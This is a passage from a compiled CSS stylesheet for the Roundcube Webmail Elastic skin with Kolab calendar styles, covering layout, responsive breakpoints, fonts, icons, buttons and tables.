 }
 .message-partheaders .subject {
   font-weight: bold;
 }
 .message-partheaders + .message-part,
 .message-partheaders + .message-htmlpart {
   border-top: 0;
   margin: 0;
 }
 #compose-attachments {
   margin: 1rem 1rem 0 1rem;
 }
 #composestatusbar {
   position: absolute;
   opacity: 0.3;
 }
 @media screen and (min-width: 769px) {
   #composestatusbar {
     display: none;
   }
 }
 #composestatusbar a.button {
   display: inline-block;
   height: 2.5rem;
   margin-right: 0.25rem;
 }
 #composestatusbar a.button:before {
   line-height: 2.5rem;
 }
 /*** Settings UI ***/
 .settings-default-icon tr > td.section::before,
 .settings-default-icon li > a:before {
   content: "\f013";
 }
 /* more accessible red */
 /* main highlight colour - message counts and quota bar - (old:Secondary Highlight)*/
 /* sidebar background colour - (old:Background Color)*/
 /* top navbar background color - (old:Sidebar Background)*/
 /* selected folder colour - (old:Primary Highlight)*/
 body ul.treelist li.selected > a {
   color: inherit;
   background-color: #0099cc;
 }
 /* text colours for sidebar - (old: Menu Text)*/
 /* this is for the compose button */
 /* this is for the rest */
 /* if bottom footer ad, adjust size */
 @media screen and (min-width: 481px) {
   #taskmenu .special-buttons {
     bottom: 0px;
   }
 }
 /* colors in fsd plugin */
 #layout #fsd_dirs li.sel > span.click {
   background-color: #0099cc;
 }
 /**
  * Kolab core library
  *
  * This file contains Elastic skin styles for calendar plugin.
  *
  * @author Aleksander Machniak <machniak@kolabsys.com>
  *
  * Copyright (C) 2012-2018, Kolab Systems AG <contact@kolabsys.com>
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU Affero General Public License as
  * published by the Free Software Foundation, either version 3 of the
  * License, or (at your option) any later version.
  *
  * This program is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  * GNU Affero General Public License for more details.
  *
  * You should have received a copy of the GNU Affero General Public License
  * along with this program. If not, see <http://www.gnu.org/licenses/>.
  */
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Font-icons ***/
 .font-icon-class,
 p.image-attachment .attachment-links a:before,
 .quota-widget:before,
 .table-widget table.options-table td:not(:first-child) span:before,
 table.table th.checkbox-cell:before,
 a.button.icon:before,
 button.btn:before,
 .floating-action-buttons a.button:before,
 .ui-dialog .ui-dialog-titlebar-close:before,
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options:before,
 .ui-datepicker .ui-datepicker-prev:before,
 .ui-datepicker .ui-datepicker-next:before,
 .pgpkeyimport div.key label.keyid + a:before,
 .pgpkeyimport li.uid:before,
 .menu a:before,
 .popover .menu li a[aria-haspopup]:after,
 .searchbar form:before,
 .searchbar a:before,
 .ui.alert > i.icon:before,
 .listing td.action a:before,
 .listing.iconized li a:before,
 .listing.iconized li > i:before,
 .listing.iconized tr td:before,
 .listing.iconized.selectable li a:before,
 ul.treelist li div.treetoggle:before,
 .folderlist li a:before,
 .messagelist tr.thread td.threads div:before,
 .messagelist td.subject span.msgicon.status:before,
 .messagelist span.attachment span,
 .messagelist span.flagged:before,
 .messagelist tr:hover span.unflagged:before,
 .contactlist td.contact:before,
 .contactlist td.contactgroup:before,
 .contactlist li a:before,
 .attachmentslist li:before,
 .attachmentslist li a.cancelupload:before,
 .attachmentslist li a.delete:before,
 .keylist li:before,
 #identities-table td.mail:before,
 #responses-table td.name:before,
 #filterslist td.name:before,
 #filtersetslist td.name:before,
 .propform td.rowbuttons a:before,
 fieldset.advanced > legend:after,
 .input-group .icon:before,
 .multi-input a.icon.reset:before,
 .tagedit-list li.tagedit-listelement-old a:before,
 .mce-window .mce-window-head .mce-close:before,
 .mce-window .mce-foot .mce-container-body .mce-btn button:before,
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:after,
 .mce-window .mce-checkbox i.mce-i-checkbox:before,
 .googie_list li .googie_list_revert:before,
 .googie_list li .googie_add_to_dict:before,
 body.status-flagged #message-header .subject:before,
 #message-header .subject a.extwin:before,
 #message-header .short-header div.header-links a:before,
 .message-part blockquote span.blockquote-link:after,
 .message-htmlpart blockquote span.blockquote-link:after,
 .listing li > div.calendar .calname:before,
 fieldset.categories .input-group a.button.create:before,
 .fc button.prev:before,
 .fc button.next:before,
 .fc .fc-time i:before,
 #eventshow .event-partstat .changersvp:before,
 .availability span:before,
 .calendar-scheduler .schedule-buttons .next-slot:after,
 .resources-dialog .listing li.resource > a:before {
   font-size: 1.25em;
   display: block;
   float: left;
   margin: 0 0.25rem 0 0;
   width: 1.18em;
   height: 1em;
   font-family: 'Icons';
   font-style: normal;
   font-weight: 900;
   text-decoration: inherit;
   text-align: center;
   speak: none;
   font-smoothing: antialiased;
   -moz-osx-font-smoothing: grayscale;
   -webkit-font-smoothing: antialiased;
 }
 .animated-icon-class {
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
 }
 .overflow-ellipsis {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .font-family {
   font-family: Roboto, sans-serif;
 }
 .style-input-focus {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /**
  * Roundcube webmail styles for the Elastic skin
  *
  * Copyright (c) 2017-2018, The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Fonts ***/
 @font-face {
   font-family: 'Icons';
   font-style: normal;
   font-weight: 900;
   src: url("/skins/elastic/fonts/fa-solid-900.woff2") format('woff2'), url("/skins/elastic/fonts/fa-solid-900.woff") format('woff');
 }
 @font-face {
   font-family: 'Icons';
   font-style: normal;
   font-weight: 400;
   src: url("/skins/elastic/fonts/fa-regular-400.woff2") format('woff2'), url("/skins/elastic/fonts/fa-regular-400.woff") format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: normal;
   font-weight: 400;
   src: local('Roboto'), local('Roboto-Regular'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-regular.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-regular.woff') format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: italic;
   font-weight: 400;
   src: local('Roboto Italic'), local('Roboto-Italic'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-italic.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-italic.woff') format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: normal;
   font-weight: 700;
   src: local('Roboto Bold'), local('Roboto-Bold'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700.woff') format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: italic;
   font-weight: 700;
   src: local('Roboto Bold Italic'), local('Roboto-BoldItalic'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700italic.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700italic.woff') format('woff');
 }
 /* Reset some Bootstrap style */
 body,
 button,
 input,
 optgroup,
 select,
 textarea,
 .popover {
   font-family: Roboto, sans-serif;
 }
 button,
 input,
 select,
 textarea {
   line-height: initial;
 }
 input {
   vertical-align: middle;
 }
 a {
   color: #0099cc;
 }
 a:hover {
   color: #007399;
 }
 a.disabled {
   pointer-events: none;
 }
 a.disabled:not(.btn) {
   opacity: 0.5;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Responsive design - Layout ***/
 /*
 - Large screen (width > 1200px)
    -----------------------------------------------------------------------------------------------------
    |  menu  |        sidebar        |         list          |                 content                  |
    -----------------------------------------------------------------------------------------------------
 - Normal screen (1200px => width => 768px) - typical: 768x1024 (iPad Mini/Air)
    -------------------------------------------------------------------
    |menu|    sidebar/list     |               content                |
    -------------------------------------------------------------------
 - Small (480px < width < 768px)
    ------------------------------------------
    |menu|     sidebar/list/content          |
    ------------------------------------------
 - Phone (width <= 480px) - typical: 320x480 (iPhone 5), 375x667 (iPhone 6-7), 360x564 (Galaxy S6)
    ------------------------
    | sidebar/list/content |
    ------------------------
 */
 html {
   height: 100%;
   font-size: 14px;
 }
 body {
   min-width: 240px;
   height: 100%;
   color: #2c363a;
   overflow: hidden;
 }
 html.iframe body {
   overflow: auto;
 }
 #layout {
   overflow: hidden;
   display: flex;
   height: 100%;
   width: 100%;
 }
 #layout > div > .scroller {
   flex: 1;
   position: relative;
 }
 #layout > div > .header,
 #layout > div > .footer {
   font-size: 1rem;
   font-weight: bold;
   line-height: 58px;
   height: 58px;
   min-height: 58px;
   padding: 0 0.25em;
   margin: 0;
   position: relative;
   overflow: hidden;
   white-space: nowrap;
   display: flex;
   justify-content: center;
 }
 #layout > div > .header {
   border-bottom: 1px solid #d4dbde;
   color: #2c363a;
   background-color: #cfdee6;
 }
 #layout > div > .header .header-title {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
   text-align: center;
   margin: 0 -20rem;
 }
 #layout > div > .header a.button {
   color: #2c363a;
 }
 #layout > div > .header a.toolbar-list-button,
 #layout > div > .header a.toolbar-menu-button {
   order: 99;
 }
 #layout > div > .footer {
   border-top: 1px solid #d4dbde;
   background-color: #fff;
 }
 #layout > div > .footer.small {
   height: 35px;
   min-height: 35px;
   line-height: 35px;
 }
 #layout > div > .footer:empty {
   display: none;
 }
 #layout-sidebar {
   display: flex;
   flex-direction: column;
   flex: 2;
   max-width: 30%;
   min-width: 220px;
   border-right: 1px solid #d4dbde;
   background-color: #fff;
 }
 #layout-sidebar.sidebar-right {
   order: 2;
   border-right: 0;
   border-left: 1px solid #d4dbde;
   flex: 3;
 }
 #layout-list {
   display: flex;
   flex-direction: column;
   flex: 3;
   max-width: 30%;
   min-width: 300px;
   border-right: 1px solid #d4dbde;
   background-color: #fff;
 }
 #layout-content {
   display: flex;
   flex: 6;
   flex-direction: column;
   min-width: 50%;
   background-color: #fff;
 }
 html.iframe #layout-content {
   height: 100%;
 }
 #layout-content > .formcontent,
 #layout-content > .content {
   height: 100%;
   width: 100%;
   overflow: auto;
   flex: 1;
 }
 #layout-content .iframe-wrapper {
   width: 100%;
   flex: 1;
 }
 #layout-content .iframe-wrapper iframe {
   width: 100%;
   height: 100%;
   border: 0;
 }
 #layout-content.only > .scroller {
   overflow: auto;
 }
 #layout-menu.popover {
   left: 0 !important;
 }
 #layout-menu .popover-header {
   height: 58px;
   line-height: 58px;
   border: 0;
   border-radius: 0;
   text-align: center;
 }
 #layout-menu .popover-header img {
   max-height: 58px;
   max-width: 78px;
   padding: 0.25rem;
 }
 @media screen and (min-width: 481px) and (max-width: 1024px) {
   #layout-menu .popover-header img {
     max-width: 35.1px;
   }
 }
 @media screen and (min-width: 481px) {
   #layout-menu .popover-header {
     padding: 0 !important;
     background-color: #000000 !important;
   }
   #layout-menu .popover-header a {
     display: none !important;
   }
 }
 html.layout-phone #layout-menu .popover-header {
   display: flex !important;
   align-items: center;
   justify-content: center;
   padding: 0 0.5rem;
 }
 html.layout-phone #layout-menu .popover-header img {
   max-width: 222px;
 }
 html.layout-phone #layout-menu .popover-header a {
   width: auto;
   flex: 1;
 }
 html.layout-phone #layout-menu .popover-header a:before {
   height: 58px;
   float: right;
 }
 html.layout-phone #layout-menu .popover-header a .inner {
   display: none;
 }
 @media screen and (max-width: 1200px) {
   #layout-sidebar,
   #layout-list {
     min-width: 260px;
     flex: 3;
   }
   #layout-list > .header > a.button {
     padding: 0 0.25rem;
     margin: 0 0.25rem;
   }
 }
 @media screen and (max-width: 768px) {
   #layout-sidebar,
   #layout-list {
     max-width: none;
     border: 0 !important;
   }
   #layout > div > .header {
     background-color: #cfdee6;
   }
   #layout > div > .header a.button {
     margin: 0 0.3rem !important;
     padding: 0 !important;
   }
   #layout > div > .header a.button:before {
     font-size: 1.75rem;
     height: 58px;
     margin: 0;
   }
   #layout > div > .header a.button.filter:before {
     font-size: 1.6rem;
   }
   #layout > div > .header a.button .inner {
     display: none;
   }
   #layout > div > .footer {
     background-color: #cfdee6;
   }
   a.toolbar-list-button {
     display: none;
   }
 }
 @media screen and (max-width: 320px) {
   #layout-sidebar,
   #layout-list {
     min-width: 240px;
   }
 }
 @media screen and (min-width: 481px) {
   a.task-menu-button {
     display: none;
   }
   #layout-menu {
     background-color: #000000;
     width: 42px;
   }
 }
 @media screen and (min-width: 769px) {
   .floating-action-buttons,
   #layout-content > .header > .header-title,
   #layout > div > .header > .buttons,
   a.toolbar-menu-button {
     display: none;
   }
 }
 @media screen and (min-width: 1025px) {
   #layout-menu {
     width: 78px;
   }
 }
 @media screen and (min-width: 1201px) {
   #layout-list > .header > .header-title:not(.all-sizes),
   a.toolbar-list-button,
   a.back-list-button,
   a.back-sidebar-button {
     display: none;
   }
 }
 html.layout-phone .hidden-phone {
   display: none !important;
 }
 html.layout-phone .hidden-small,
 html.layout-small .hidden-small {
   display: none !important;
 }
 html.layout-small .hidden-lbs {
   display: none !important;
 }
 html.layout-large .hidden-lbs,
 html.layout-normal .hidden-lbs,
 html.layout-large .hidden-big,
 html.layout-normal .hidden-big {
   display: none !important;
 }
 html.layout-large .hidden-large {
   display: none !important;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Common UI elements ***/
 .rcmaddcontact,
 .hidden,
 .voice {
   display: none !important;
 }
 font.bold {
   font-weight: bold;
 }
 #rcmdraglayer {
   min-width: 260px;
   width: 260px;
   background-color: #000000;
   color: #fff;
   box-shadow: 3px 3px 5px #f1f3f4;
   border-radius: 0.3rem;
   z-index: 250;
   opacity: 0.92;
   padding: 0.5rem;
   white-space: nowrap;
 }
 #rcmdraglayer div {
   line-height: 1.6em;
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .frame-content {
   padding: 1rem;
 }
 .frame-content h2 {
   font-weight: bold;
   font-size: 1.5em;
 }
 .frame-content h3 {
   font-weight: bold;
   font-size: 1.25em;
 }
 .listbox .scroller {
   width: 100%;
   overflow-x: hidden;
   overflow-y: auto;
 }
 .listbox .navlist {
   height: 0;
   flex: initial !important;
 }
 .listbox .navlist .listing tr:last-child td,
 .listbox .navlist .listing li:last-child {
   border-bottom: 0;
 }
 .popup .listbox {
   height: 100%;
   display: flex;
   flex-direction: column;
 }
 .popup .listbox .scroller {
   flex: 1;
 }
 .popup .listbox .footer {
   border-top: 1px solid #d4dbde;
   background-color: #fbfbfb;
 }
 .contact-header {
   display: flex;
   margin-bottom: 1rem;
 }
 .contact-header .contact-photo {
   min-width: 112px;
 }
 .contact-header .contact-head {
   margin-left: 1rem;
   margin-top: 0 !important;
 }
 .contact-header .contact-head legend {
   display: none;
 }
 p.image-attachment {
   position: relative;
   border: 1px solid #ddd;
   border-radius: 0.3rem;
   background-color: rgba(0, 153, 204, 0.05);
   float: left;
   margin: 0.5rem;
   min-width: 47%;
   min-height: 250px;
   overflow: hidden;
   display: flex;
   justify-content: center;
 }
 @media screen and (max-width: 480px) {
   p.image-attachment {
     float: none;
     margin: 0.5rem 0 0.5rem 0;
   }
 }
 p.image-attachment .image-link {
   align-self: center;
   text-align: center;
   margin: 1.6rem 0.5rem;
 }
 p.image-attachment span {
   color: #737677;
   padding: 0 0.5rem;
   font-size: 90%;
   white-space: nowrap;
   position: absolute;
   line-height: 1.5rem;
 }
 p.image-attachment .image-filename {
   overflow: hidden;
   text-overflow: ellipsis;
   left: 0;
   top: 0;
   right: 0;
   padding-right: 4rem;
 }
 p.image-attachment .image-filesize {
   right: 0;
   top: 0;
 }
 p.image-attachment .attachment-links {
   position: absolute;
   bottom: 0;
   left: 0;
   width: 100%;
   text-align: center;
 }
 p.image-attachment .attachment-links a {
   text-decoration: none;
   display: inline-block;
   padding: 0 0.5rem;
   line-height: 1.5rem;
 }
 p.image-attachment .attachment-links a:before {
   display: inline-block;
 }
 p.image-attachment .attachment-links a.open:before {
   content: "\f360";
 }
 p.image-attachment .attachment-links a.download:before {
   content: "\f019";
 }
 fieldset.image-attachment {
   margin-top: 0.5rem;
 }
 fieldset.image-attachment legend {
   color: #737677;
   font-size: 0.9rem;
   border-top: 1px solid #f5f5f5;
   margin: 0;
 }
 fieldset.image-attachment img {
   max-width: 100%;
 }
 #folder-selector {
   overflow-y: auto;
 }
 .noselect {
   user-select: none;
   -moz-user-select: none;
   -khtml-user-select: none;
   -ms-user-select: none;
   -webkit-user-select: none;
 }
 .iframe-loader {
   width: 100%;
   position: absolute;
   top: 0;
   bottom: 0;
   background-color: rgba(255, 255, 255, 0.95);
   display: flex;
   align-items: center;
   justify-content: center;
   z-index: 3;
 }
 .iframe-loader .spinner-border {
   width: 7rem;
   height: 7rem;
   color: #f1f3f4;
   border: 1rem solid;
   border-color: currentColor #737677 currentColor currentColor;
 }
 .footer.toolbar + .iframe-loader {
   top: 58px;
   bottom: 58px;
 }
 .ios-scroll {
   padding: 0;
   -webkit-overflow-scrolling: touch !important;
   overflow: scroll !important;
 }
 .ios-scroll.iframe-wrapper {
   margin-top: 1px;
 }
 .webkit-scroller::-webkit-scrollbar {
   -webkit-appearance: none;
 }
 .webkit-scroller::-webkit-scrollbar:vertical {
   width: 0.5rem;
 }
 .webkit-scroller::-webkit-scrollbar:horizontal {
   height: 0.5rem;
 }
 .webkit-scroller::-webkit-scrollbar-thumb {
   background-color: rgba(0, 0, 0, 0.3);
   border-radius: 0.25rem;
   border: 2px solid #fff;
 }
 .quota-widget {
   width: 100%;
   max-width: 15em;
   padding: 0.5rem 1rem;
   display: flex;
   align-items: center;
   color: #737677;
 }
 .quota-widget:before {
   content: "\f0a0";
   line-height: 1;
 }
 .quota-widget .count {
   color: #737677;
   font-size: 80%;
   order: 2;
 }
 .quota-widget .bar {
   flex: 1;
   height: 0.5rem;
   margin: 0 1rem;
   background-color: #fff;
   border: 1px solid #d4dbde;
   border-radius: 0.25rem;
   overflow: hidden;
 }
 .quota-widget .value {
   display: block;
   background-color: #0099cc;
   height: 1rem;
   opacity: 0.75;
 }
 .quota-widget .value.warning {
   background-color: #EC1313;
 }
 .image-tools {
   position: absolute;
   top: 5rem;
   left: 0;
   height: 58px;
   overflow: hidden;
   transform: translateX(-87%);
   transition: transform 0.3s ease-in-out;
   background-color: rgba(0, 153, 204, 0.4);
   border-radius: 0 0.3rem 0.3rem 0;
 }
 .image-tools .menu {
   float: left;
 }
 .image-tools a.button.icon.tools {
   padding: 0 0.25rem;
   display: inline-block;
   height: 58px;
 }
 .image-tools a.button.icon.tools span.inner {
   display: none;
 }
 .image-tools a.button.icon.tools:before {
   line-height: 58px;
   margin: 0;
 }
 .image-tools.open {
   transform: translateX(0);
 }
 .image-tools.open a.button.icon.tools:before {
   content: "\f053";
 }
 .image-tools a {
   color: #fff !important;
 }
 .image-tools a:focus,
 .image-tools a:hover {
   background-color: rgba(0, 153, 204, 0.5) !important;
   outline: 0;
 }
 .quota-info {
   width: 100%;
   display: table !important;
 }
 .quota-info td,
 .quota-info th {
   text-align: center;
   white-space: nowrap;
 }
 .quota-info th {
   border-top: 0;
 }
 .quota-info .root {
   line-height: 1;
   font-style: italic;
   color: #737677;
   background-color: #f1f3f4;
 }
 .quota-info th:first-child,
 .quota-info .name {
   text-align: left;
 }
 .nav-tabs {
   flex-wrap: nowrap;
 }
 .nav-tabs .nav-item {
   white-space: nowrap;
   overflow: hidden;
 }
 .nav-tabs .nav-link {
   overflow: hidden;
   text-overflow: ellipsis;
 }
 .props-table td.title {
   width: 7em;
 }
 .table-widget {
   display: flex;
   flex-direction: column;
   margin-bottom: 0.5rem;
   border: 1px solid #d4dbde;
 }
 .table-widget > .content {
   overflow-x: auto;
   flex-grow: 1;
   height: 18.5em;
 }
 .table-widget > .content table th {
   border-top: 0;
 }
 .table-widget > .footer {
   height: 3.5rem;
   border-top: 1px solid #d4dbde;
   text-align: left;
 }
 .table-widget > .footer a {
   padding: 0.2rem 0.45rem !important;
   height: 3.5rem !important;
 }
 .table-widget table {
   margin: 0;
   max-height: 18.5em;
 }
 .table-widget table.options-table td,
 .table-widget table.options-table th {
   text-align: center;
   vertical-align: middle;
 }
 .table-widget table.options-table td:first-child,
 .table-widget table.options-table th:first-child {
   overflow: hidden;
   text-overflow: ellipsis;
   text-align: left;
 }
 .table-widget table.options-table tr:last-child td {
   border-bottom: 1px solid #d4dbde;
 }
 .table-widget table.options-table tr.selected td {
   background-color: #0099cc;
   color: #2c363a;
   outline: 0;
 }
 .table-widget table.options-table td:not(:first-child) span {
   display: inline-block;
   line-height: 1.25;
 }
 .table-widget table.options-table td.enabled span:before {
   content: "\f00c";
 }
 .table-widget table.options-table td.partial span:before {
   opacity: 0.3;
   content: "\f00c";
 }
 table.compact-table {
   margin: 0;
   width: 100%;
 }
 table.compact-table *:not(.invalid-feedback) {
   font-size: inherit;
 }
 table.compact-table td {
   padding: 0.25rem;
   border: 0;
 }
 table.compact-table td:first-child {
   padding-left: 0;
 }
 table.compact-table td:last-child {
   padding-right: 0;
 }
 table.table .checkbox-cell {
   width: 3rem;
   white-space: nowrap;
   overflow: hidden;
   text-align: center;
   padding: 0.5rem;
 }
 html.touch table.table .checkbox-cell {
   padding: 0.5rem 0.3rem;
 }
 table.table th.checkbox-cell {
   padding: 0.75rem 0;
   max-width: 1rem;
 }
 table.table th.checkbox-cell:before {
   cursor: pointer;
   margin: 0 1rem;
   line-height: 1;
 }
 table.table th.checkbox-cell.subscription:before {
   content: "\f143";
 }
 table.table th.checkbox-cell.alarm:before {
   content: "\f0f3";
   font-weight: 400;
 }
 table.table th.checkbox-cell.read:before {
   content: "\f06e";
 }
 table.table th.checkbox-cell.write:before {
   content: "\f303";
 }
 table.table .buttons-cell {
   width: 1%;
   white-space: nowrap;
   text-align: center;
 }
 table.table .buttons-cell a.button:before {
   line-height: 1;
   float: none;
   display: inline-block;
 }
 @media screen and (min-width: 480px) {
   table.table .buttons-cell a.button .inner {
     display: inline;
   }
 }
 table.table label {
   margin: 0;
   display: inline;
 }
 fieldset.tab-pane table.table thead th {
   border: 0;
 }
 table.table tr.deleted td {
   color: rgba(44, 54, 58, 0.5) !important;
 }
 /* Bootstrap's .table style overwrites */
 .table thead th {
   border-width: 1px;
   white-space: nowrap;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Buttons ***/
 .button.disabled {
   opacity: 0.5;
 }
 a.button {
   text-decoration: none;
 }
 /* font-icons */
 a.button.icon.sidebar-menu:before,
 button.btn.sidebar-menu:before,
 a.button.icon.toolbar-menu-button:before,
 button.btn.toolbar-menu-button:before,
 a.button.icon.toolbar-list-button:before,
 button.btn.toolbar-list-button:before {
   content: "\f142";
   width: 1em;
 }
 a.button.icon.task-menu-button:before,
 button.btn.task-menu-button:before {
   content: "\f0c9";
 }
 a.button.icon.back-sidebar-button:before,
 button.btn.back-sidebar-button:before,
 a.button.icon.back-content-button:before,
 button.btn.back-content-button:before,
 a.button.icon.back-list-button:before,
 button.btn.back-list-button:before {
   content: "\f053";
 }
 a.button.icon.refresh:before,
 button.btn.refresh:before {
   content: "\f021";
 }
 a.button.icon.generate:before,
 button.btn.generate:before,
 a.button.icon.yes:before,
 button.btn.yes:before,
 a.button.icon.submit:before,
 button.btn.submit:before,
 a.button.icon.continue:before,
 button.btn.continue:before,
 a.button.icon.save:before,
 button.btn.save:before {
   content: "\f00c";
 }
 a.button.icon.create:before,
 button.btn.create:before {
   content: "\f0fe";
 }
 a.button.icon.edit:before,
 button.btn.edit:before {
   content: "\f303";
 }
 a.button.icon.qrcode:before,
 button.btn.qrcode:before {
   content: "\f029";
 }
 a.button.icon.search:before,
 button.btn.search:before {
   content: "\f002";
 }
 a.button.icon.filter:before,
 button.btn.filter:before {
   content: "\f0b0";
   font-size: 1.2em;
 }
 a.button.icon.import:before,
 button.btn.import:before {
   content: "\f093";
 }
 a.button.icon.export:before,
 button.btn.export:before {
   content: "\f019";
 }
 a.button.icon.discard:before,
 button.btn.discard:before,
 a.button.icon.delete:before,
 button.btn.delete:before {
   content: "\f2ed";
   font-weight: 400;
 }
 a.button.icon.next:before,
 button.btn.next:before {
   content: "\f061";
 }
 a.button.icon.restore:before,
 button.btn.restore:before {
   content: "\f0e2";
 }
 a.button.icon.send:before,
 button.btn.send:before,
 a.button.icon.bounce:before,
 button.btn.bounce:before {
   content: "\f1d8";
 }
 a.button.icon.attach:before,
 button.btn.attach:before {
   content: "\f0c6";
 }
 a.button.icon.attach.vcard:before,
 button.btn.attach.vcard:before {
   content: "\f007";
 }
 a.button.icon.no:before,
 button.btn.no:before,
 a.button.icon.close:before,
 button.btn.close:before,
 a.button.icon.cancel:before,
 button.btn.cancel:before {
   content: "\f00d";
 }
 a.button.icon.back:before,
 button.btn.back:before {
   content: "\f053";
 }
 a.button.icon.remove:before,
 button.btn.remove:before {
   content: "\f00d";
 }
 a.button.icon.unlock:before,
 button.btn.unlock:before {
   content: "\f09c";
 }
 a.button.icon.help:before,
 button.btn.help:before {
   content: "\f1cd";
   font-weight: 400;
 }
 a.button.icon.folders:before,
 button.btn.folders:before {
   content: "\f07c";
 }
 a.button.icon.options:before,
 button.btn.options:before {
   content: "\f1de";
 }
 a.button.icon.tools:before,
 button.btn.tools:before,
 a.button.icon.settings:before,
 button.btn.settings:before {
   content: "\f013";
 }
 a.button.icon.properties:before,
 button.btn.properties:before {
   content: "\f05a";
 }
 a.button.icon.selection:before,
 button.btn.selection:before {
   content: "\f14a";
   font-weight: 400;
 }
 a.button.icon.insert.recipient:before,
 button.btn.insert.recipient:before {
   content: "\f234";
 }
 a.button.icon.encrypt:before,
 button.btn.encrypt:before {
   content: "\f023";
 }
 a.button.icon.sign:before,
 button.btn.sign:before {
   content: "\f5b7";
 }
 a.button.icon.sso:before,
 button.btn.sso:before {
   content: "\f2f6";
 }
 a.btn:before,
 button.btn:before {
   display: inline !important;
   float: none !important;
   vertical-align: middle;
   margin-right: 0.4rem !important;
 }
 a.button.icon.dropdown:before {
   content: "\f0d7";
   font-size: 1em;
 }
 a.button.icon > span.inner {
   display: none;
 }
 html.touch .btn:focus {
   box-shadow: none !important;
 }
 .floating-action-buttons {
   position: absolute;
   right: 0;
   bottom: 0;
 }
 .footer:not(:empty) + .floating-action-buttons {
   bottom: 35px;
 }
 .floating-action-buttons a.button {
   display: block;
   float: left;
   width: 4rem;
   height: 4rem;
   border-radius: 50%;
   background: #0099cc;
   color: white;
   opacity: 0.95;
   box-shadow: 0 0 5px 5px #80dfff;
   margin: 0 1rem 1rem 0;
 }
 .floating-action-buttons a.button:before {
   content: "\f067";
   width: 4rem;
   height: 4rem;
   line-height: 4rem;
 }
 .floating-action-buttons a.button.compose:before {
   content: "\f304";
 }
 .floating-action-buttons a.button .inner {
   display: none;
 }
 /*** Bootstrap button style overrides ***/
 .btn:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.3);
 }
 .btn-secondary {
   color: #fff;
   background: #8b9fa7;
   border-color: #8b9fa7;
 }
 .btn-secondary:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.5);
 }
 .btn-secondary:hover {
   background: #7c939c;
   border-color: #778e98;
 }
 .btn-secondary.disabled,
 .btn-secondary:disabled {
   background: #c5cfd3;
   border-color: #c5cfd3;
   opacity: 1;
 }
 .btn-secondary:not(:disabled):not(.disabled):active,
 .btn-secondary:not(:disabled):not(.disabled).active {
   background: #6e8791;
   border-color: #6a828b;
 }
 .btn-secondary:not(:disabled):not(.disabled):active:focus,
